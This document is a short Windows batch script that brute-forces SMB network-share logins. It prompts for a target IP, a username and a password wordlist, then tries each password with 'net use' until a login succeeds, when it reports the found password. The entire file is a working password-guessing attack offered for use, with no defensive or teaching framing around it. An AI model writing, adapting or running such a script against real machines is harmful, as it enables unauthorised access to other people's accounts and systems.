@echo off
title PR0GRAM
color A
echo.
set /p ip="Enter IP Adress: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count = 0
for /f %%a in (%wordlist%) do (
    echo %%a
    set pass=%%a
    call :attempt
)
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found !: %pass%
net use\\%ip% /d /y >nul >2
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul >2
echo ATTEMPT: %pass%
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
